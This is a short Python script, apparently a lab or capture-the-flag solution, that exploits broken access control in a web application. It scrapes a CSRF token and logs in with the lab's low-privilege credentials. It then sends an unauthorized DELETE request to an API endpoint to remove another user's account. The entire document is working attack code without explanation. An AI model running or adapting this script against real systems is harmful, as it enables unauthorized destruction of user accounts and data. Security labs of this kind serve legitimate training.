import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

base_url = sys.argv[1] + '/login'
delete_url = sys.argv[1] + '/api/user/carlos'

def get_csrf_token(response_text):
    return re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response_text).group(1)

session = requests.Session()
response = session.get(base_url)
csrf_token = get_csrf_token(response.text)
login_data = {
    'csrf': csrf_token,
    'username': 'wiener',
    'password': 'peter'
}

session.post(base_url, data=login_data)
delete_response = session.delete(delete_url)

